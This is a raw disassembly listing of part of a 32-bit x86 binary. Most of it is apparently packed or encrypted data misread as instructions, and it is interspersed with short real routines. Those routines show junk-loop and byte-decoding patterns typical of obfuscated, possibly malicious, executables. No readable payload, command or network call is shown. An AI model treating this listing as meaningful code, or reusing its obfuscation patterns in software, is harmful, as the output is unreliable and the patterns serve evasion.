  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0xbe0,0x1c
  4063d1:	inc    ecx
  4063d2:	dec    eax
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x4063d5
  4063dc:	out    0x8,al
  4063de:	mov    ecx,0xc1a282e5
  4063e3:	mov    ds:0x8eed3604,al
  4063e9:	fst    DWORD PTR [edx]
  4063eb:	rcr    BYTE PTR [eax-0x474e5f3c],0x8e
  4063f2:	into   
  4063f3:	in     eax,0x54
  4063f5:	inc    esp
  4063f6:	or     DWORD PTR [ecx-0x74],esi
  4063f9:	call   0x8f895972
  4063fe:	sub    BYTE PTR [edx+0x34],ch
  406401:	add    cl,dl
  406403:	sub    BYTE PTR [ebx-0x26],ch
  406406:	adc    edi,edi
  406408:	test   DWORD PTR [ecx+0x56fabb87],0x6e556a19
  406412:	not    BYTE PTR [esi+0x63]
  406415:	test   eax,0x53154f1a
  40641a:	sub    al,0x7a
  40641c:	or     esp,eax
  40641e:	cmp    ebx,0x7e
  406421:	or     ch,BYTE PTR [edi+ecx*8-0x76]
  406425:	fwait
  406426:	xchg   DWORD PTR [ebx],edx
  406428:	imul   edx,DWORD PTR [edx],0x98ad0cca
  40642e:	fs shr ah,0x35
  406432:	sub    BYTE PTR ds:0x5d7d3cc3,bh
  406438:	mov    ebx,0x8f16bae2
  40643d:	lods   al,BYTE PTR ds:[esi]
  40643e:	fnstcw WORD PTR [edx+ebp*4-0x7b]
  406442:	add    BYTE PTR [ecx-0x366e2f3],0xdd
  406449:	mov    esi,0xaa24f297
  40644e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40644f:	sub    DWORD PTR [edi+esi*4+0x74],0x1f1a609e
  406457:	scas   eax,DWORD PTR es:[edi]
  406458:	and    al,0x9a
  40645a:	adc    eax,DWORD PTR [eax+0x50d19e1e]
  406460:	pop    ebx
  406461:	retf   
  406462:	call   0x870c36e7
  406467:	sub    ah,BYTE PTR [eax-0x2a]
  40646a:	push   0x33
  40646c:	and    eax,0xc7d02cfa
  406471:	shl    DWORD PTR [ecx+0x7fb65862],0x69
  406478:	adc    esi,DWORD PTR gs:[esi-0x3f]
  40647c:	pushf  
  40647d:	adc    bh,ah
  40647f:	mov    eax,ds:0xc1a6b354
  406484:	mov    ch,0xc6
  406486:	loop   0x40646b
  406488:	out    0x32,al
  40648a:	call   0xa2acde50
  40648f:	pop    ebx
  406490:	rcl    DWORD PTR [ecx-0x6ed7dd4a],0x27
  406497:	push   ds
  406498:	std    
  406499:	scas   eax,DWORD PTR es:[edi]
  40649a:	test   eax,0xae39a971
  40649f:	and    eax,DWORD PTR [ebp-0x79ce20f0]
  4064a5:	xchg   DWORD PTR [ecx+0x5bbbc953],eax
  4064ab:	push   esi
  4064ac:	pusha  
  4064ad:	inc    esp
  4064ae:	jnp    0x406528
  4064b0:	jge    0x406489
  4064b2:	cmp    edx,DWORD PTR [ecx]
  4064b4:	scas   eax,DWORD PTR es:[edi]
  4064b5:	fbstp  TBYTE PTR [ecx+0x5683eb80]
  4064bb:	les    edi,FWORD PTR [esi+0x19]
  4064be:	mov    edx,0xc4be96
  4064c3:	(bad)  
  4064c5:	pop    edx
  4064c6:	jp     0x4064bc
  4064c8:	push   ebx
  4064c9:	xor    DWORD PTR [eax+ebp*1],ebp
  4064cc:	inc    DWORD PTR [ebx]
  4064ce:	add    eax,0xd1fc901
  4064d3:	fidiv  DWORD PTR [eax-0x3e]
  4064d6:	adc    al,0x27
  4064d8:	aad    0xa
  4064da:	mov    DWORD PTR [ecx+esi*4],esi
  4064dd:	mov    ch,0x7c
  4064df:	mov    ah,BYTE PTR [edx]
  4064e1:	push   es
  4064e2:	push   cs
  4064e3:	shr    DWORD PTR [edx],1
  4064e5:	stos   BYTE PTR es:[edi],al
  4064e6:	rol    DWORD PTR [edx],0x7c
  4064e9:	(bad)  
  4064eb:	mov    eax,0x7f1335be
  4064f0:	ret    0xe72a
  4064f3:	test   BYTE PTR [edx-0x61],ch
  4064f6:	or     ebp,DWORD PTR [ebx]
  4064f8:	add    ecx,DWORD PTR [ecx]
  4064fa:	cmp    eax,0xcbf0f560
  4064ff:	retf   
  406500:	add    eax,0x1eb280cd
  406505:	cli    
  406506:	jmp    0xf373:0xfff7cae1
  40650d:	adc    edi,DWORD PTR ss:[ebx+0x642aa6c]
  406514:	and    BYTE PTR [esi+0x2f],dl
  406517:	pop    ss
  406518:	xchg   ecx,eax
  406519:	add    BYTE PTR [ebx-0x24],0x3
  40651d:	or     al,0xe6
  40651f:	mov    DWORD PTR [esi],edi
  406521:	test   cl,ah
  406523:	in     eax,dx
  406524:	les    edi,FWORD PTR [ecx+0x26]
  406527:	les    edi,FWORD PTR [ebx-0x4204818c]
  40652d:	fisub  WORD PTR [ebp+0x21]
  406530:	pop    ebp
  406531:	pusha  
  406532:	in     al,dx
  406533:	jb     0x40652f
  406535:	das    
  406536:	test   DWORD PTR [edi],edi
  406538:	iret   
  406539:	mov    ah,0xfa
  40653b:	imul   eax,DWORD PTR [eax-0x34fd1249],0x64c505e7
  406545:	push   0x75
  406547:	shl    DWORD PTR [edx+0x15],0x12
  40654b:	and    ecx,ecx
  40654d:	lock push esp
  40654f:	test   DWORD PTR [ebp+0x581d63b],ebx
  406555:	imul   eax,edi,0x6b
  406558:	push   edi
  406559:	repnz addr16 aaa 
  40655c:	fisttp QWORD PTR [ebp+ebp*2-0x49]
  406560:	hlt    
  406561:	test   DWORD PTR [ebx],esi
  406563:	loope  0x406546
  406565:	js     0x40652e
  406567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406568:	or     BYTE PTR [edx],al
  40656a:	ja     0x40653a
  40656c:	test   al,ch
  40656e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40656f:	dec    DWORD PTR [ebx-0x70]
  406572:	ficom  WORD PTR [esi+0x16]
  406575:	mov    al,0x2f
  406577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406578:	dec    esi
  406579:	jb     0x406556
  40657b:	dec    edi
  40657c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40657d:	push   esp
  40657e:	fstp   DWORD PTR [edx+0x6d]
  406581:	lds    esi,FWORD PTR [ebx]
  406583:	dec    esi
  406584:	fmul   st,st(2)
  406586:	ds push DWORD PTR cs:[eax]
  40658a:	xor    BYTE PTR [ebp-0x698f8e9f],al
  406590:	imul   ecx,DWORD PTR [ebx-0x51d83af],0x83b2e078
  40659a:	jne    0x406523
  40659c:	sub    DWORD PTR [ecx+0x481e19c9],edx
  4065a2:	cs fwait
  4065a4:	mov    al,0xc6
  4065a6:	push   eax
  4065a7:	test   al,0x23
  4065a9:	in     al,dx
  4065aa:	mov    esp,0xad8c96af
  4065af:	fwait
  4065b0:	sbb    al,0xc2
  4065b2:	shl    DWORD PTR [ecx+0x45],1
  4065b5:	xchg   ecx,eax
  4065b6:	call   0x404d49
  4065bb:	test   eax,eax
  4065bd:	je     0x4065e8
  4065c3:	lea    eax,[ebp-0x78]
  4065c6:	push   eax
  4065c7:	mov    eax,DWORD PTR [ebp-0x14]
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1+0x5fe188fd]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x40664f
  40660b:	not    DWORD PTR [edx-0x17a56699]
  406611:	(bad)  
  406612:	cs push 0x7ae98909
  406618:	jmp    0xb42bd0c6
  40661d:	cmp    eax,0xaf08ef2b
  406622:	gs in  eax,dx
  406624:	aas    
  406625:	and    DWORD PTR [eax+edx*2+0x7],ecx
  406629:	mov    bh,0x1a
  40662b:	stos   BYTE PTR es:[edi],al
  40662c:	out    0x69,eax
  40662e:	add    BYTE PTR [edx-0x35],bl
  406631:	mov    bh,0x5a
  406633:	aaa    
  406634:	mov    esp,0x7256f320
  406639:	xor    eax,0xc84f161d
  40663e:	mov    eax,0xd0606e68
  406643:	mov    dh,0xa7
  406645:	popf   
  406646:	aam    0x4f
  406648:	pop    edi
  406649:	adc    edx,DWORD PTR [ecx+eax*8]
  40664c:	jmp    0x406660
  40664e:	and    ah,BYTE PTR ds:0x10d984d3
  406654:	pop    ebp
  406655:	cmp    bl,BYTE PTR [eax-0x5570d1a6]
  40665b:	or     al,0x91
  40665d:	xchg   esp,eax
  40665e:	pop    ebx
  40665f:	not    dh
  406661:	xchg   ebx,ebx
  406663:	push   edi
  406664:	push   0x14babd74
  406669:	xchg   BYTE PTR [edx+0x64],cl
  40666c:	or     eax,0x19730987
  406671:	popf   
  406672:	sbb    esi,DWORD PTR [ebx]
  406674:	cmp    eax,0x5ff95b00
  406679:	fwait
  40667a:	repz inc edi
  40667c:	push   cs
  40667d:	push   ebx
  40667e:	xchg   ebx,eax
  40667f:	and    eax,0xd2257afa
  406684:	popa   
  406685:	xchg   esi,eax
  406686:	loopne 0x4066e8
  406688:	adc    esi,DWORD PTR [edx]
  40668a:	pusha  
  40668b:	in     eax,dx
  40668c:	call   0xdc53:0x6b811a4f
  406693:	add    BYTE PTR [esi],cl
  406695:	int    0x6f
  406697:	jmp    0xd1e9a150
  40669c:	(bad)  
  40669d:	adc    dl,cl
  40669f:	xor    ah,ah
  4066a1:	lock sub al,0x9f
  4066a4:	add    eax,0xc57fad49
  4066a9:	sub    eax,0xda06590
  4066ae:	fcomp  DWORD PTR [edi+0x597b4e92]
  4066b4:	shr    DWORD PTR [edx+edx*4],cl
  4066b7:	stc    
  4066b8:	mov    WORD PTR [esi+0x5f5aedde],es
  4066be:	addr16 or eax,0xc0ac3475
  4066c4:	(bad)  
  4066c5:	jg     0x406666
  4066c7:	add    DWORD PTR [edx-0x3ecd9305],0xffffffb8
  4066ce:	dec    ebp
  4066cf:	and    al,0xe9
  4066d1:	int    0x1e
  4066d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066d4:	mov    dh,0x63
  4066d6:	jmp    0x406706
  4066d8:	cmp    DWORD PTR [edi+0x67],ebx
  4066db:	sbb    BYTE PTR [ebx-0x2a],ch
  4066de:	and    DWORD PTR ds:0x1f55a864,esi
  4066e4:	cdq    
  4066e5:	sbb    eax,0xb80a1f98
  4066ea:	push   ebp
  4066eb:	shl    BYTE PTR [ecx],0x3c
  4066ee:	or     bh,BYTE PTR [edi-0x7]
  4066f1:	les    ebp,FWORD PTR [edi]
  4066f3:	sbb    BYTE PTR [edx-0x782f4004],ah
  4066f9:	(bad)
  4066fc:	adc    eax,0x62498cec
  406701:	cmp    BYTE PTR [edx],ah
  406703:	cmc    
  406704:	pop    ss
  406705:	loopne 0x406718
  406707:	or     esi,eax
  406709:	xchg   ecx,eax
  40670a:	jb     0x4066a4
  40670c:	inc    bp
  40670e:	popa   
  40670f:	je     0x40673a
  406711:	pop    edi
  406712:	pop    ds
  406713:	lea    ebx,[ebp-0x12c8e55f]
  406719:	mov    ebp,0xb18c60ff
  40671e:	xchg   esp,eax
  40671f:	mov    edx,0xf4775d38
  406724:	int    0x5e
  406726:	cmc    
  406727:	dec    eax
  406728:	add    dl,ah
  40672a:	leave  
  40672b:	scas   eax,DWORD PTR es:[edi]
  40672c:	sbb    eax,0xb13aa5bc
  406731:	clc    
  406732:	inc    ecx
  406733:	pop    ds
  406734:	or     esi,ebx
  406736:	cld    
  406737:	cwde   
  406738:	jle    0x4066f1
  40673a:	cmp    esp,DWORD PTR [ecx]
  40673c:	mov    ebp,0x7b08d121
  406741:	retfw  
  406743:	pop    eax
  406744:	mov    ch,0x9b
  406746:	pop    eax
  406747:	adc    bh,dh
  406749:	or     al,BYTE PTR [edi+0x1003212d]
  40674f:	scas   eax,DWORD PTR es:[edi]
  406750:	dec    DWORD PTR [ebx-0x673a3c9]
  406756:	out    dx,eax
  406757:	(bad)
  40675b:	add    bl,BYTE PTR [edx-0x7c4d646d]
  406761:	mov    DWORD PTR [eax],ebx
  406763:	pop    ecx
  406764:	xor    edi,DWORD PTR [eax+0x28afca5e]
  40676a:	jne    0x40678d
  40676c:	lahf   
  40676d:	ja     0x40671d
  40676f:	add    eax,0x5f
  406772:	and    eax,0x33af8e85
  406777:	fidivr DWORD PTR [esp+ecx*2]
  40677a:	daa    
  40677b:	xchg   BYTE PTR [edi+0x777dabcb],ch
  406781:	pusha  
  406782:	call   0xd26bf4cc
  406787:	rcr    ecx,cl
  406789:	cmp    eax,DWORD PTR [esi-0x2]
  40678c:	jae    0x4067e6
  40678e:	pop    esp
  40678f:	xchg   esi,eax
  406790:	push   0x6f
  406792:	enter  0x1179,0x51
  406796:	xor    eax,0x1370331f
  40679b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40679c:	shr    DWORD PTR [ebp+0xbdf72ee],cl
  4067a2:	(bad)  
  4067a3:	aaa    
  4067a4:	push   edi
  4067a5:	scas   eax,DWORD PTR es:[edi]
  4067a6:	ret    0x6104
  4067a9:	inc    eax
  4067aa:	dec    ebp
  4067ab:	inc    esp
  4067ac:	xor    edi,DWORD PTR [esi+0x67a23023]
  4067b2:	mov    edi,0x7fff82bf
  4067b7:	xor    DWORD PTR [edi+0x20],ecx
  4067ba:	ret    0xcc7e
  4067bd:	dec    esp
  4067be:	aaa    
  4067bf:	dec    esi
  4067c0:	ret    0xaaf2
  4067c3:	(bad)  
  4067c4:	mov    bh,0x40
  4067c6:	clc    
  4067c7:	mov    bl,0x6f
  4067c9:	jae    0x4067ec
  4067cb:	aas    
  4067cc:	cmp    DWORD PTR [ebx],esp
  4067ce:	add    ah,bh
  4067d0:	popf   
  4067d1:	mov    al,cl
  4067d3:	test   eax,0xab787590
  4067d8:	jmp    0x40675b
  4067da:	mov    DWORD PTR [ebx+0x5b],edx
  4067dd:	dec    eax
  4067de:	jmp    0xf37f:0x97a4aa69
  4067e5:	mov    eax,0xffcd8d65
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0x9db9:0xb33cf6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	xchg   edi,eax
  406865:	test   DWORD PTR fs:[eax],esi
  406868:	mov    bl,0x92
  40686a:	popa   
  40686b:	das    
  40686c:	push   cs
  40686d:	frstor [edx+edx*8+0x4b]
  406871:	pop    ebx
  406872:	mul    DWORD PTR [ecx]
  406874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406875:	shl    DWORD PTR [eax+0x2f4a6f46],cl
  40687b:	mov    ds:0x73b1c43e,eax
  406880:	sub    edx,DWORD PTR ds:0x2d3b088d
  406886:	sub    al,0x16
  406888:	cmp    eax,0xda019c66
  40688d:	das    
  40688e:	xchg   ebx,eax
  40688f:	jle    0x4068eb
  406891:	push   ss
  406892:	xor    al,0xc
  406894:	bound  ebp,QWORD PTR [esi]
  406896:	sbb    eax,0x7325fee6
  40689b:	add    BYTE PTR [ecx-0x1e],bl
  40689e:	push   eax
  40689f:	shl    esi,1
  4068a1:	add    al,0x27
  4068a3:	sbb    eax,0x8c4f4150
  4068a8:	out    0xca,eax
  4068aa:	push   0x6b
  4068ac:	aaa    
  4068ad:	add    BYTE PTR [ebx],dl
  4068af:	mov    bl,0xd
  4068b1:	push   ebx
  4068b2:	mov    cl,0xe8
  4068b4:	mov    ecx,0xafcb6662
  4068b9:	mov    ah,0xb
  4068bb:	pop    edx
  4068bc:	ins    DWORD PTR es:[edi],dx
  4068bd:	xor    ebx,esp
  4068bf:	adc    edx,ebp
  4068c1:	retf   
  4068c2:	inc    ebx
  4068c3:	in     al,0x66
  4068c5:	adc    esi,DWORD PTR [ebx]
  4068c7:	jns    0x4068d3
  4068c9:	jo     0x406877
  4068cb:	call   0xecef37dd
  4068d0:	push   esi
  4068d1:	scas   eax,DWORD PTR es:[edi]
  4068d2:	in     eax,0xb
  4068d4:	stos   BYTE PTR es:[edi],al
  4068d5:	(bad)  
  4068d6:	fld    TBYTE PTR [ebx]
  4068d8:	xchg   edi,eax
  4068d9:	push   ds
  4068da:	or     eax,0xace2a9e5
  4068df:	arpl   WORD PTR [ecx-0xedbb673],bp
  4068e5:	ins    BYTE PTR es:[edi],dx
  4068e6:	shl    BYTE PTR [ebx-0x14],0xd8
  4068ea:	daa    
  4068eb:	sbb    ah,bh
  4068ed:	push   esp
  4068ee:	pushf  
  4068ef:	hlt    
  4068f0:	stc    
  4068f1:	or     edx,DWORD PTR [ebx+0x24]
  4068f4:	push   0xf6da0026
  4068f9:	mov    esi,0x5ddcb4e6
  4068fe:	xchg   ecx,eax
  4068ff:	jle    0x4068c3
  406901:	mov    ds:0xe5c000e4,al
  406906:	jmp    0x77773822
  40690b:	je     0x406917
  40690d:	xor    bl,BYTE PTR [ecx]
  40690f:	(bad)  
  406911:	fcomp  st(5)
  406913:	retf   0x2f93
  406916:	ins    DWORD PTR es:[edi],dx
  406917:	inc    ebp
  406918:	ins    DWORD PTR es:[edi],dx
  406919:	cmp    eax,0xe9a7ec60
  40691e:	push   eax
  40691f:	sub    DWORD PTR [esp+edi*1+0x91197a9],0xecd59d7b
  40692a:	and    al,0x6d
  40692c:	xchg   edx,eax
  40692d:	dec    edx
  40692e:	pushf  
  40692f:	shr    DWORD PTR [edi+edi*8+0x22],cl
  406933:	sbb    al,0x41
  406935:	add    ecx,DWORD PTR ds:0xfaeab6f8
  40693b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40693c:	bound  ebp,QWORD PTR [ecx+edx*4+0x4630e50e]
  406943:	fnstcw WORD PTR [ecx+0x7aaf3484]
  406949:	xor    eax,0x815c4fe9
  40694e:	sub    eax,0x135bcb5e
  406953:	mov    esi,0x82cb3dc
  406958:	fisubr DWORD PTR [eax]
  40695a:	mov    ebp,0x3fc5b5ba
  40695f:	dec    esp
  406960:	and    DWORD PTR [edi],esp
  406962:	icebp  
  406963:	xchg   ecx,eax
  406964:	aaa    
  406965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406966:	(bad)  [edi]
  406968:	leave  
  406969:	or     al,0xa1
  40696b:	pop    ecx
  40696c:	pop    edx
  40696d:	pop    ebp
  40696e:	pushf  
  40696f:	or     bh,BYTE PTR [ebx]
  406971:	xor    BYTE PTR [ebp+0x46d18a01],bl
  406977:	cld    
  406978:	push   ebx
  406979:	(bad)  
  40697a:	cmp    bl,dh
  40697c:	mov    BYTE PTR [eax+0x1e],cl
  40697f:	push   ebx
  406980:	das    
  406981:	jg     0x40695f
  406983:	scas   al,BYTE PTR es:[edi]
  406984:	fwait
  406985:	cmp    esp,edx
  406987:	call   0x552d3d04
  40698c:	mov    ch,0x2b
  40698e:	xchg   edx,eax
  40698f:	cmp    edx,ebp
  406991:	les    ebp,FWORD PTR [edx+0x35]
  406994:	retf   
  406995:	rcr    BYTE PTR [esi+0x6c],0x24
  406999:	lds    edi,FWORD PTR [esi]
  40699b:	ficom  DWORD PTR [ebp+0x27]
  40699e:	outs   dx,DWORD PTR ds:[esi]
  40699f:	imul   ecx,DWORD PTR [edi-0x566800a8],0x81acae7c
  4069a9:	inc    edi
  4069aa:	mov    edi,0x31b21ac
  4069af:	jg     0x4069f3
  4069b1:	inc    ecx
  4069b2:	mov    ebp,edx
  4069b4:	mov    cl,0xa5
  4069b6:	and    ebp,esp
  4069b8:	adc    al,0xa
  4069ba:	dec    ebp
  4069bb:	cmc    
  4069bc:	jmp    0x301525be
  4069c1:	js     0x4069a1
  4069c3:	test   BYTE PTR [edx+ebx*4+0x3e890583],al
  4069ca:	repnz xor eax,0x5303e5e1
  4069d0:	jle    0x406a4d
  4069d2:	dec    edx
  4069d3:	add    BYTE PTR [ebx+esi*4-0x29],bh
  4069d7:	(bad)  
  4069d8:	mov    BYTE PTR [bp+si+0x4d],bh
  4069dc:	mov    DWORD PTR [ebp-0x40],eax
  4069df:	ds mov dh,al
  4069e2:	mov    ebx,0xe7ca5486
  4069e7:	xchg   edi,eax
  4069e8:	arpl   WORD PTR [edx],dx
  4069ea:	jbe    0x4069d4
  4069ec:	enter  0xa358,0x6f
  4069f0:	loope  0x406a08
  4069f2:	sub    BYTE PTR [edi-0x5],bh
  4069f5:	mov    ds:0x2c7640a5,al
  4069fa:	jmp    0x23de:0x15fce229
  406a01:	(bad)  
  406a03:	xlat   BYTE PTR ds:[ebx]
  406a04:	inc    edx
  406a05:	clc    
  406a06:	int3   
  406a07:	and    DWORD PTR [edi],edi
  406a09:	enter  0xf244,0x32
  406a0d:	repnz add DWORD PTR [ebp-0x6d],edx
  406a11:	lock inc ecx
  406a13:	fsub   QWORD PTR [edx*4+0x1070d53]
  406a1a:	jnp    0x4069ce
  406a1c:	call   0x6d54e83d
  406a21:	enter  0x7f55,0xd0
  406a25:	adc    DWORD PTR [esi],0xffffff8e
  406a28:	mov    eax,0x61954ee
  406a2d:	shl    BYTE PTR [edx-0x229b953e],1
  406a33:	test   esi,0xf3860a5a
  406a39:	add    al,0xa7
  406a3b:	jb     0x406a5a
  406a3d:	iret   
  406a3e:	fcomp  DWORD PTR [eax-0x1]
  406a41:	push   eax
  406a42:	add    DWORD PTR [ebx+0xd8be045],ecx
  406a48:	and    al,0x22
  406a4a:	inc    ecx
  406a4b:	add    BYTE PTR [ecx],al
  406a4d:	or     BYTE PTR [edi+0x5e],bl
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ede3,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ede3,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ede3,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ec1b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ede3
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ede3,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x4304e7
  406aa5:	xor    edi,DWORD PTR ds:0x430435
  406aab:	mov    DWORD PTR ds:0x4304e7,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x43045d,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x43045d
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x43045d,ecx
  406ad3:	cmp    DWORD PTR ds:0x43045d,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e8b7
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ec1f
  406af9:	cmp    DWORD PTR ds:0x43045d,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x4304df,0x15
  406b1d:	cmp    DWORD PTR ds:0x4304df,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x4304df,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e9df
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x4304df
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x4304df,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x430435,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x4304d7,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x4304d7
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x4304d7,ecx
  406b87:	cmp    DWORD PTR ds:0x4304d7,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x4304d7,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e7e6
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42eaa7
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e7c8
  406bcd:	add    DWORD PTR ds:0x43043d,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42edcb
  406bdf:	and    edi,DWORD PTR ds:0x4304e3
  406be5:	mov    DWORD PTR ds:0x42edcb,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0xfc307504
  406bfe:	(bad)  
  406bff:	adc    eax,0x7e7e3a65
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406c49
  406c09:	clc    
  406c0a:	mov    ecx,0xd2dae11
  406c0f:	repz cmp al,0x4b
  406c12:	pop    edx
  406c13:	int    0xe3
  406c15:	dec    ecx
  406c16:	pop    ecx
  406c17:	cwde   
  406c18:	and    BYTE PTR [ebx],cl
  406c1a:	out    dx,al
  406c1b:	push   edi
  406c1c:	mov    esp,DWORD PTR [esp+edi*1+0x36]
  406c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c21:	xlat   BYTE PTR ds:[ebx]
  406c22:	loopne 0x406c5f
  406c24:	andps  xmm3,xmm1
  406c27:	fisub  DWORD PTR [edx+0x43]
  406c2a:	dec    edx
  406c2b:	popa   
  406c2c:	out    dx,eax
  406c2d:	retf   
  406c2e:	dec    edi
  406c2f:	mov    cs,WORD PTR [ebx]
  406c31:	adc    ch,BYTE PTR [ecx+edx*1+0x7c]
  406c35:	inc    ebx
  406c36:	push   0xa92b572e
  406c3b:	mov    eax,ds:0xe78333c
  406c40:	shl    DWORD PTR [ebp+0x5a],cl
  406c43:	cmp    BYTE PTR [ebx],0xd5
  406c46:	fdiv   DWORD PTR [ebp-0x50]
  406c49:	pop    eax
  406c4a:	add    DWORD PTR [esi+0x53],eax
  406c4d:	dec    ebp
  406c4e:	push   ecx
  406c4f:	jmp    0xaa3d:0x72e883b3
  406c56:	xor    ecx,ebp
  406c58:	pop    es
  406c59:	xor    edi,ebp
  406c5b:	mov    ch,0x8e
  406c5d:	push   ebp
  406c5e:	adc    cl,ch
  406c60:	shl    dh,0x6d
  406c63:	ins    BYTE PTR es:[edi],dx
  406c64:	push   DWORD PTR [esi-0x6a]
  406c67:	xchg   ebx,eax
  406c68:	mov    ebx,0x8de63899
  406c6d:	and    esi,edx
  406c6f:	dec    ebp
  406c70:	and    DWORD PTR [esi+ebx*1+0x5fa3e4a3],esp
